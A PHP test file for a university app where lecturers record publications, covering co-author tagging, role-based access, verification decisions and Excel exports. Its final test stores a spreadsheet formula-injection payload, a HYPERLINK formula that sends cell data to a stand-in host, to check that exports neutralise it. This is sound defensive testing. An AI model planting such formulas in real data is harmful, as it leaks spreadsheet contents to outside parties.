<?php

use App\Enums\ScientificWorkIndexation;
use App\Enums\ScientificWorkStatus;
use App\Enums\ScientificWorkType;
use App\Enums\UserRole;
use App\Models\Lecturer;
use App\Models\ScientificWork;
use App\Models\Student;
use App\Models\StudyProgram;
use App\Notifications\ScientificWorkReviewedNotification;
use App\Notifications\ScientificWorkTaggedNotification;
use Illuminate\Support\Facades\Notification;
use Inertia\Testing\AssertableInertia as Assert;

/**
 * @return array<string, mixed>
 */
function workPayload(array $overrides = []): array
{
    return [
        'title' => 'Analisis Kemampuan Pemecahan Masalah Matematis Siswa MTs',
        'type' => 'journal_national',
        'indexation' => 'sinta_3',
        'year' => now()->year,
        'venue' => 'Jurnal Pendidikan Matematika',
        'author_role' => 'first',
        'source' => 'research',
        'funding' => 'self',
        'doi' => 'https://doi.org/10.1234/jpm.2026.01',
        'evidence_url' => 'https://drive.google.com/drive/folders/abc',
        ...$overrides,
    ];
}

beforeEach(function () {
    $this->programA = StudyProgram::factory()->create();
    $this->programB = StudyProgram::factory()->create();
    $this->dosenUser = userWithRole(UserRole::Dosen);
    $this->lecturer = Lecturer::factory()->for($this->programA)->create(['user_id' => $this->dosenUser->id]);
    $this->adminProdi = userWithRole(UserRole::AdminProdi, ['study_program_id' => $this->programA->id]);
    $this->lpm = userWithRole(UserRole::AdminLpm);
});

it('lets a lecturer record their own work with links as evidence', function () {
    $this->actingAs($this->dosenUser)->post(route('research.mine.store'), workPayload())->assertSessionHasNoErrors();

    $work = ScientificWork::query()->sole();

    expect($work->lecturer_id)->toBe($this->lecturer->id)
        ->and($work->status)->toBe(ScientificWorkStatus::Pending)
        ->and($work->indexation)->toBe(ScientificWorkIndexation::Sinta3)
        ->and($work->doi)->toBe('10.1234/jpm.2026.01')
        ->and($work->created_by)->toBe($this->dosenUser->id);

    $this->actingAs($this->dosenUser)->get(route('research.mine.index'))
        ->assertInertia(fn (Assert $page) => $page->component('research/mine')
            ->has('works', 1)
            ->where('works.0.rank_label', 'S3')
            ->where('works.0.category_label', 'Artikel & Publikasi Ilmiah'));
});

it('requires an indexation for journals, at least one link, and drops fields that do not apply', function () {
    $this->actingAs($this->dosenUser)->post(route('research.mine.store'), workPayload(['indexation' => '']))
        ->assertSessionHasErrors(['indexation' => 'Pilih indeksasi/akreditasi jurnal atau prosiding.']);

    $this->actingAs($this->dosenUser)->post(route('research.mine.store'), workPayload(['doi' => '', 'evidence_url' => '']))
        ->assertSessionHasErrors(['evidence_url' => 'Isi minimal satu tautan: Link Publikasi, DOI, atau Link Bukti.']);

    $this->actingAs($this->dosenUser)->post(route('research.mine.store'), workPayload(['evidence_url' => 'drive bukti']))
        ->assertSessionHasErrors('evidence_url');

    $this->actingAs($this->dosenUser)->post(route('research.mine.store'), workPayload(['type' => 'ip_copyright', 'venue' => 'DJKI', 'ip_status' => '']))
        ->assertSessionHasErrors(['ip_status' => 'Pilih status HKI.']);

    $this->actingAs($this->dosenUser)->post(route('research.mine.store'), workPayload(['type' => 'book_text', 'ip_number' => 'EC001', 'ip_status' => 'granted']))->assertSessionHasNoErrors();

    expect(ScientificWork::query()->sole())
        ->indexation->toBe(ScientificWorkIndexation::NotApplicable)
        ->ip_number->toBeNull()
        ->ip_status->toBeNull();
});

it('tags students from master data and by name, and co-author lecturers who see the work and are notified', function () {
    Notification::fake();
    $student = Student::factory()->for($this->programA)->create(['name' => 'Siti Aminah', 'nim' => '2511001']);
    $partnerUser = userWithRole(UserRole::Dosen);
    $partner = Lecturer::factory()->for($this->programB)->create(['user_id' => $partnerUser->id]);

    $this->actingAs($this->dosenUser)->post(route('research.mine.store'), workPayload([
        'author_count' => 4,
        'lecturers' => [$partner->id],
        'students' => [['student_id' => $student->id], ['name' => 'Budi Alumni', 'nim' => '2011009']],
    ]))->assertSessionHasNoErrors();

    $work = ScientificWork::query()->sole();

    expect($work->studentMembers()->pluck('name')->all())->toBe(['Siti Aminah', 'Budi Alumni'])
        ->and($work->studentMembers()->pluck('student_id')->all())->toBe([$student->id, null])
        ->and($work->lecturerMembers()->value('lecturer_id'))->toBe($partner->id);
    Notification::assertSentTo($partnerUser, ScientificWorkTaggedNotification::class);
    Notification::assertNotSentTo($this->dosenUser, ScientificWorkTaggedNotification::class);

    $this->actingAs($partnerUser)->get(route('research.mine.index', ['tab' => 'ditandai']))
        ->assertInertia(fn (Assert $page) => $page->has('works', 0)->has('tagged', 1)->where('tab', 'tagged')
            ->where('tagged.0.students.0.nim', '2511001')
            ->where('tagged.0.students.1.name', 'Budi Alumni'));

    // Dosen rekan tidak dapat mengubah karya, hanya melepas tandanya.
    $this->actingAs($partnerUser)->put(route('research.mine.update', $work), workPayload())->assertForbidden();
    $this->actingAs($partnerUser)->delete(route('research.mine.untag', $work))->assertRedirect();
    expect($work->lecturerMembers()->count())->toBe(0);
});

it('validates tagged authors against the author role and the number of authors', function () {
    $student = Student::factory()->for($this->programA)->create();

    $this->actingAs($this->dosenUser)->post(route('research.mine.store'), workPayload(['author_role' => 'single', 'students' => [['student_id' => $student->id]]]))
        ->assertSessionHasErrors(['author_role' => 'Penulis tunggal tidak dapat menandai dosen rekan atau mahasiswa.']);

    $this->actingAs($this->dosenUser)->post(route('research.mine.store'), workPayload(['author_count' => 1, 'students' => [['student_id' => $student->id]]]))
        ->assertSessionHasErrors('author_count');

    $this->actingAs($this->dosenUser)->post(route('research.mine.store'), workPayload(['lecturers' => [$this->lecturer->id]]))
        ->assertSessionHasErrors(['lecturers.0' => 'Pemilik karya tidak perlu ditandai sebagai dosen rekan.']);

    $this->actingAs($this->dosenUser)->post(route('research.mine.store'), workPayload(['students' => [['nim' => '123']]]))
        ->assertSessionHasErrors(['students.0.name' => 'Isi nama mahasiswa.']);
});

it('finds students and lecturers to tag', function () {
    Student::factory()->for($this->programB)->create(['name' => 'Rahmat Hidayat', 'nim' => '2412345']);
    Lecturer::factory()->nuptkOnly()->for($this->programB)->create(['name' => 'Rahmawati', 'nuptk' => '7350765666130123']);

    $this->actingAs($this->dosenUser)->getJson(route('research.people', ['jenis' => 'mahasiswa', 'q' => '24123']))
        ->assertOk()->assertJsonPath('0.name', 'Rahmat Hidayat')->assertJsonPath('0.number', '2412345');

    $this->actingAs($this->dosenUser)->getJson(route('research.people', ['jenis' => 'dosen', 'q' => 'Rahma']))
        ->assertOk()->assertJsonPath('0.number', '7350765666130123');

    $this->actingAs(userWithRole(UserRole::Mahasiswa))->getJson(route('research.people', ['jenis' => 'mahasiswa']))->assertForbidden();
});

it('keeps lecturers away from works of other lecturers', function () {
    $other = ScientificWork::factory()->for(Lecturer::factory()->for($this->programA))->create();

    $this->actingAs($this->dosenUser)->put(route('research.mine.update', $other), workPayload())->assertForbidden();
    $this->actingAs($this->dosenUser)->delete(route('research.mine.destroy', $other))->assertForbidden();
    $this->actingAs($this->dosenUser)->delete(route('research.mine.untag', $other))->assertNotFound();
    $this->actingAs($this->dosenUser)->get(route('research.works.index'))->assertForbidden();
    $this->actingAs($this->dosenUser)->get(route('research.analysis'))->assertForbidden();
});

it('sends an edited valid work back to verification and blocks deleting it', function () {
    $work = ScientificWork::factory()->for($this->lecturer)->create(['status' => ScientificWorkStatus::Verified, 'verified_by' => $this->lpm->id, 'verified_at' => now()]);

    $this->actingAs($this->dosenUser)->delete(route('research.mine.destroy', $work))->assertRedirect();
    expect($work->fresh())->not->toBeNull();

    $this->actingAs($this->dosenUser)->put(route('research.mine.update', $work), workPayload(['title' => 'Judul diperbaiki']))->assertSessionHasNoErrors();

    expect($work->fresh()->status)->toBe(ScientificWorkStatus::Pending)
        ->and($work->fresh()->verified_by)->toBeNull()
        ->and($work->fresh()->title)->toBe('Judul diperbaiki');
});

it('scopes the kaprodi list to works of their lecturers, including co-authored ones', function () {
    ScientificWork::factory()->for($this->lecturer)->create(['title' => 'Karya Prodi A']);
    $lecturerB = Lecturer::factory()->for($this->programB)->create();
    ScientificWork::factory()->for($lecturerB)->create(['title' => 'Karya Prodi B']);
    $shared = ScientificWork::factory()->for($lecturerB)->create(['title' => 'Karya Bersama', 'year' => now()->year - 1]);
    $shared->members()->create(['kind' => 'lecturer', 'lecturer_id' => $this->lecturer->id, 'name' => $this->lecturer->full_name]);

    $this->actingAs($this->adminProdi)->get(route('research.works.index'))
        ->assertInertia(fn (Assert $page) => $page->component('research/works')->has('works.data', 2)
            ->where('works.data.0.title', 'Karya Prodi A')
            ->where('works.data.1.title', 'Karya Bersama'));

    $this->actingAs($this->adminProdi)->post(route('research.works.store'), workPayload(['lecturer_id' => $lecturerB->id]))->assertForbidden();

    $this->actingAs($this->adminProdi)->post(route('research.works.store'), workPayload(['lecturer_id' => $this->lecturer->id]))->assertSessionHasNoErrors();
    expect($this->lecturer->scientificWorks()->count())->toBe(2);
});

it('filters the list by category, indexation family and student involvement', function () {
    $withStudent = ScientificWork::factory()->for($this->lecturer)->indexed(ScientificWorkIndexation::ScopusQ2)->create(['type' => ScientificWorkType::JournalInternational]);
    $withStudent->members()->create(['kind' => 'student', 'name' => 'Siti']);
    ScientificWork::factory()->for($this->lecturer)->create(['type' => ScientificWorkType::TextBook, 'indexation' => ScientificWorkIndexation::NotApplicable]);

    $count = fn (array $filters) => $this->actingAs($this->lpm)->get(route('research.works.index', $filters))->viewData('page')['props']['works']['total'];

    expect($count(['category' => 'book']))->toBe(1)
        ->and($count(['indexation_family' => 'scopus']))->toBe(1)
        ->and($count(['with_students' => 1]))->toBe(1)
        ->and($count(['search' => 'Siti']))->toBe(1);
});

it('records the four LPM decisions and notifies the lecturer of every non-valid one', function () {
    Notification::fake();
    $work = ScientificWork::factory()->for($this->lecturer)->create();

    $this->actingAs($this->lpm)->post(route('research.works.verify', $work), ['decision' => 'revision'])
        ->assertSessionHasErrors('note');

    foreach (['revision' => 'DOI tidak bisa dibuka', 'invalid' => 'Bukan karya dosen ini', 'duplicate' => 'Sudah dicatat oleh dosen rekan'] as $decision => $note) {
        $this->actingAs($this->lpm)->post(route('research.works.verify', $work), ['decision' => $decision, 'note' => $note])->assertSessionHasNoErrors();

        expect($work->fresh())->status->toBe(ScientificWorkStatus::from($decision))->verification_note->toBe($note);
    }
    Notification::assertSentToTimes($this->dosenUser, ScientificWorkReviewedNotification::class, 3);

    $this->actingAs($this->lpm)->post(route('research.works.verify', $work), ['decision' => 'verified'])->assertSessionHasNoErrors();

    expect($work->fresh()->status)->toBe(ScientificWorkStatus::Verified)
        ->and($work->fresh()->verified_by)->toBe($this->lpm->id)
        ->and($work->fresh()->verification_note)->toBeNull();

    $this->actingAs($this->adminProdi)->post(route('research.works.verify', $work), ['decision' => 'verified'])->assertForbidden();
});

it('lets LP2M and pimpinan see and export the works, but not change or verify them', function (UserRole $role) {
    $viewer = userWithRole($role);
    $work = ScientificWork::factory()->for($this->lecturer)->create();

    $this->actingAs($viewer)->get(route('research.works.index'))->assertOk();
    $this->actingAs($viewer)->get(route('research.analysis'))->assertOk();
    $this->actingAs($viewer)->get(route('research.works.export'))->assertOk();
    $this->actingAs($viewer)->post(route('research.works.store'), workPayload(['lecturer_id' => $this->lecturer->id]))->assertForbidden();
    $this->actingAs($viewer)->post(route('research.works.verify', $work), ['decision' => 'verified'])->assertForbidden();
})->with([UserRole::Lp2m, UserRole::Pimpinan]);

it('credits shared works to every lecturer involved without counting them twice', function () {
    $year = now()->year;
    $partner = Lecturer::factory()->for($this->programA)->create(['name' => 'Dosen Rekan']);
    $shared = ScientificWork::factory()->for($this->lecturer)->indexed(ScientificWorkIndexation::Sinta2)
        ->create(['year' => $year, 'status' => ScientificWorkStatus::Verified]);
    $shared->members()->createMany([
        ['kind' => 'lecturer', 'lecturer_id' => $partner->id, 'name' => 'Dosen Rekan'],
        ['kind' => 'student', 'name' => 'Siti'],
    ]);
    ScientificWork::factory()->for($this->lecturer)->create(['year' => $year - 1, 'type' => ScientificWorkType::ReferenceBook, 'indexation' => ScientificWorkIndexation::NotApplicable]);
    $idle = Lecturer::factory()->for($this->programA)->create(['name' => 'Dosen Belum Berkarya']);
    ScientificWork::factory()->for($idle)->create(['year' => $year - 6]);
    Lecturer::factory()->for($this->programA)->create(['is_active' => false]);
    ScientificWork::factory()->for($idle)->create(['year' => $year, 'status' => ScientificWorkStatus::Invalid]);

    $this->actingAs($this->adminProdi)->get(route('research.analysis'))
        ->assertInertia(fn (Assert $page) => $page
            ->component('research/analysis')
            ->where('filters.from', $year - 2)
            ->where('summary.lecturers', 3)
            ->where('summary.productive', 2)
            ->where('summary.without', 1)
            ->where('summary.works', 2)
            ->where('summary.sinta', 1)
            ->where('summary.with_students', 1)
            ->where('summary.student_rate', 50)
            ->where('byProgram.0.works', 2)
            ->where('lecturers', fn ($rows) => collect($rows)->firstWhere('name', $partner->full_name)['works'] === 1
                && collect($rows)->firstWhere('name', $idle->full_name)['last_year'] === $year - 6)
            ->where('byIndexation', fn ($rows) => collect($rows)->firstWhere('key', 'sinta_2')['count'] === 1)
            ->where('byYear.2.journal', 1)
            ->where('byYear.1.book', 1));

    $this->actingAs($this->adminProdi)->get(route('research.analysis', ['verified_only' => 1]))
        ->assertInertia(fn (Assert $page) => $page->where('summary.works', 1));

    $this->actingAs($this->adminProdi)->get(route('research.analysis', ['study_program_id' => $this->programB->id]))->assertForbidden();
});

it('exports the analysis with the list of lecturers without works', function () {
    ScientificWork::factory()->for($this->lecturer)->create();
    Lecturer::factory()->for($this->programA)->create(['name' => 'Dosen Belum Berkarya', 'back_title' => null]);

    $response = $this->actingAs($this->adminProdi)->get(route('research.analysis.export'));
    $rows = downloadedRows($response, 'Belum punya karya');

    expect($rows[0][0])->toBe('NIDN/NIDK')
        ->and(collect($rows)->pluck(2))->toContain('Dosen Belum Berkarya');
});

it('exports works in the LPM template layout with recaps that count shared works once', function () {
    $this->lecturer->update(['nuptk' => '7350765666130123']);
    $partner = Lecturer::factory()->for($this->programB)->create(['name' => 'Dosen Rekan', 'back_title' => null, 'nidn' => '0899999999']);
    $student = Student::factory()->for($this->programA)->create(['name' => 'Siti Aminah', 'nim' => '2511001']);
    $work = ScientificWork::factory()->for($this->lecturer)->indexed(ScientificWorkIndexation::ScopusQ1)
        ->create(['title' => 'Karya Ekspor', 'type' => ScientificWorkType::JournalInternational, 'status' => ScientificWorkStatus::Verified]);
    $work->members()->createMany([
        ['kind' => 'lecturer', 'lecturer_id' => $partner->id, 'name' => 'Dosen Rekan'],
        ['kind' => 'student', 'student_id' => $student->id, 'name' => 'Siti Aminah', 'nim' => '2511001'],
    ]);
    ScientificWork::factory()->for($partner)->create(['type' => ScientificWorkType::Copyright, 'indexation' => ScientificWorkIndexation::NotApplicable, 'ip_status' => 'granted']);
    ScientificWork::factory()->for($partner)->indexed(ScientificWorkIndexation::ScopusQ1)->create(['title' => 'Karya Ekspor (dobel)', 'status' => ScientificWorkStatus::Duplicate]);

    $response = $this->actingAs($this->lpm)->get(route('research.works.export'));

    $data = downloadedRows($response, 'Data Karya Dosen');
    $row = collect($data)->firstWhere(7, 'Karya Ekspor');
    expect($data)->toHaveCount(4)
        ->and($data[0][0])->toBe('No.')
        ->and($data[0][27])->toBe('Catatan Verifikasi')
        ->and($row[5])->toBe('Artikel & Publikasi Ilmiah')
        ->and($row[15])->toBe('Scopus Q1')
        ->and($row[16])->toBe('Q1')
        ->and($row[24])->toBe('Valid')
        ->and($row[28])->toBe('7350765666130123')
        ->and($row[29])->toBe('Dosen Rekan (0899999999)')
        ->and($row[30])->toBe('Siti Aminah (2511001)');

    $lpm = collect(downloadedRows($response, 'Rekap LPM'))->mapWithKeys(fn (array $row) => [$row[0] ?? '' => $row[1] ?? null]);
    expect($lpm['Total seluruh karya'])->toBe('2')
        ->and($lpm['Publikasi Scopus'])->toBe('1')
        ->and($lpm['HKI'])->toBe('1')
        ->and($lpm['Karya lainnya'])->toBe('1')
        ->and($lpm['Karya valid terverifikasi LPM'])->toBe('1')
        ->and($lpm['Karya melibatkan mahasiswa'])->toBe('1')
        ->and($lpm['Tidak valid / duplikat (tidak dihitung)'])->toBe('1')
        ->and($lpm['Scopus Q1'])->toBe('1');

    $perLecturer = collect(downloadedRows($response, 'Rekap per Dosen'))->keyBy(0);
    expect($perLecturer['Dosen Rekan'][3])->toBe('2')
        ->and($perLecturer['Dosen Rekan'][11])->toBe('1');

    $perProgram = collect(downloadedRows($response, 'Rekap per Prodi'))->keyBy(0);
    expect($perProgram[$this->programA->full_name][1])->toBe('1')
        ->and($perProgram[$this->programB->full_name][1])->toBe('2');
});

it('exports text that starts with an equals sign as plain text, not a formula', function () {
    $payload = '=HYPERLINK("http://contoh.test/?d="&A2,"Klik")';
    ScientificWork::factory()->for($this->lecturer)->create(['title' => $payload, 'co_authors' => '=1+1']);

    $response = $this->actingAs($this->lpm)->get(route('research.works.export'));
    $path = tempnam(sys_get_temp_dir(), 'xlsx').'.xlsx';
    file_put_contents($path, $response->streamedContent());

    $zip = new ZipArchive;
    $zip->open($path);
    $sheet = $zip->getFromName('xl/worksheets/sheet2.xml');
    $zip->close();

    expect($sheet)->not->toContain('<f>')
        ->and(downloadedRows($response, 'Data Karya Dosen')[1][7])->toBe($payload);
});
